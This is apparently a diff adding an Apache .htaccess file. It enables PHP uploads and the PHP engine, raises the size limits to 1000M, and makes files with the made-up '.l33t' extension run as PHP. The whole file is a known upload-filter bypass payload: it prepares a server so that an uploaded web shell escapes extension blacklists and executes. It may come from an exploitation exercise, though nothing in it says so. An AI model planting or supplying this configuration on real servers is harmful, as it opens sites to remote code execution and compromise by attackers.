@@ -1,0 +1,7 @@
+php_flag file_uploads On
+php_flag engine On
+
+php_value upload_max_filesize 1000M
+php_value post_max_size 1000M
+
+AddType application/x-httpd-php .l33t
